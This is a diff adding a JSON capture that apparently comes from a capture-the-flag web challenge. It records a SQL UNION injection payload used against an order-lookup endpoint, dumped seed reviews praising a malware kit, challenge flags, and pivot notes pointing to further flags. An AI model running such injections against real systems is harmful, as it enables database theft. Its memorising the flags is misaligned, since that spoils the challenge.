@@ -1,0 +1,44 @@
+{
+  "_provenance": {
+    "host": "134.209.117.21",
+    "captured_at": "2026-06-21T17:30:42Z",
+    "via": "GET /api/orders/lookup?ref=' UNION SELECT id,userId,listingId,reviewText,moderationNote,createdAt FROM Review WHERE 1=1 --",
+    "columns": ["id", "userId", "listingId", "reviewText", "moderationNote", "createdAt"]
+  },
+  "reviews": [
+    {
+      "id": "seed-cyberghost",
+      "userId": "xyz78",
+      "listingId": "rat-builder",
+      "reviewText": "Worth every penny. Client was shocked at how quickly we got domain admin. Stealth features are next level.",
+      "moderationNote": null,
+      "createdAt": "2026-06-21T17:30:42.494Z"
+    },
+    {
+      "id": "seed-phantom-hacker",
+      "userId": "k7m3n",
+      "listingId": "rat-builder",
+      "reviewText": "Had some issues with Windows Defender but still got persistence. Keylogger works perfectly.",
+      "moderationNote": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
+      "createdAt": "2026-06-21T17:30:42.491Z"
+    },
+    {
+      "id": "seed-shadow-op",
+      "userId": "abc12",
+      "listingId": "rat-builder",
+      "reviewText": "Got domain admin in under 2 hours. The obfuscation completely bypassed their EDR.",
+      "moderationNote": null,
+      "createdAt": "2026-06-21T17:30:42.484Z"
+    }
+  ],
+  "_pivot_notes": {
+    "web6_target": "seed-phantom-hacker — PUT /api/reviews/seed-phantom-hacker leaks moderationNote",
+    "web7_breadcrumb": "userId k7m3n owns the completed `order-admin-001` whose notes field holds the web7 flag",
+    "seed_filehashes": {
+      "seed-cyberghost":     "(real MD5; not a flag)",
+      "seed-phantom-hacker": "0c7406664fa3077c4a9a535f424d7ecd",
+      "seed-shadow-op":      "(real MD5; not a flag)"
+    },
+    "user_created_filehash": "bitflag{md5_1s_br0k3n_l1k3_my_h34rt}  -- stamped on every NEW review row (Proof Stamp flag, web6 decoy)"
+  }
+}
